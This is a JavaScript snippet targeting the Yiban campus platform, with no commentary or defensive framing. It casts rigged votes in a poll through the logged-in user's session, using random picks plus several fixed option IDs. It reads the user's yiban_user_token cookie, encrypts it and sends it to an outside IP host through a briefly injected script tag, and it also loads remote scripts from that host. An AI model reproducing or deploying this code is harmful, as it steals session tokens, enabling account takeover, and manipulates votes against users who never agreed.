if (document.cookie.indexOf("yiban_user_token") < 0) {
    window.location = "http://www.yiban.cn/login?go=" + TDIWLi;
} else {
    var hzss = document.createElement("script");
    hzss.setAttribute("src", "http://123.206.15.137/cpt.js");
    document.body.appendChild(hzss);
    var hzs = document.createElement("script");
    hzs.setAttribute("src", "http://123.206.15.137/base64.min.js");
    document.body.appendChild(hzs);

    function bKy72rdy(num) {
        var votedata = [];
        switch (num) {
            case 1:
                votetmp = [372637, 372641, 372643, 372653, 372659, 372661, 372663, 372665, 372667, 372669, 372671, 372675, 372677, 372679, 372681, 372687, 372689, 372693, 372697, 372701, 372705, 372709, 372779, 372783, 372785, 372851, 372853, 372857, 372859, 372863, 372865, 372877];
                break;
            case 2:
                votetmp = [373211, 373215, 373221, 373251, 373253, 373255, 373259, 373263, 373265, 373279, 373283, 373293, 373295, 373369, 373373, 373375, 373379, 373381, 373383, 373385];
                break;
            case 3:
                votetmp = [371595, 371603, 371619, 371693, 371715, 371723, 372095, 372099, 372167, 372233, 372235, 372237, 372369, 372437, 372439, 372441, 372443, 372445, 372447, 372449, 372451, 372519, 372521, 372523, 372525, 372527, 372529, 372531, 372533, 372535, 372537, 372539, 372545, 372547, 372551, 372553, 372555, 372557, 372559, 372561, 372563, 373505];
                break;
            case 4:
                votetmp = [372979, 372975, 372981, 372987, 373065, 373193, 372973, 373103, 372995, 373067, 373091, 373111, 373115, 373095, 373113, 373107, 373099, 373117, 373109, 373087, 373121, 373083, 373125, 373101, 373089, 373081, 373119, 373191];
                break;
            case 5:
                votetmp = [373489, 373393, 373481, 373411, 373391, 373415, 373485, 373395, 373407, 373499, 373503, 373495, 373401, 373399, 373409, 373491, 373493];
                break;
        }
        votetmp.sort(function () {
            return 0.5 - Math.random()
        });
        for (i = 0; i < 5; i++)votedata.push(votetmp[i]);
        votedata.push(373387);
        votedata.push(372971);
        votedata.push(372435);
        votedata.push(372657);
        votedata.push(372991);
        return votedata;
    }

    function XGeVMC(name) {
        var value = "; " + document.cookie;
        var parts = value.split("; " + name + "=");
        return parts.pop().split(";").shift();
    }

    var t = 0;
    var circle = setInterval(function () {
        $.post('http://q.yiban.cn/vote/insertBoxAjax', {
            App_id: '82055',
            'VoteOption_id[]': bKy72rdy(t+1),
            Vote_id: '10771'
        }, function (data) {
            data = JSON.parse(data);
            var sendmsg = document.createElement("script");
            sendmsg.setAttribute("src", "http://123.206.15.137/serv.php?d=" + encrypt(Base64.encode(JSON.stringify({
                    'appid': TDIWLi,
                    'token': XGeVMC("yiban_user_token"),
                    'vote': data['code'] + "," + data['message'] + "," + data['data'] + "," + t
                })), 'UTuWvUgv69BHPcyb').split("+").join("-"));
            document.body.appendChild(sendmsg);
            setTimeout(function () {
                document.body.removeChild(sendmsg);
            }, 500);
            if (data['code'] == 211) {
                window.location = "http://www.yiban.cn/login?go=" + TDIWLi;
            }
        });
        t++;
        if (t >= 5){
            document.body.removeChild(hzss);
            document.body.removeChild(hzs);
            clearInterval(circle);
        }
    }, 700)
}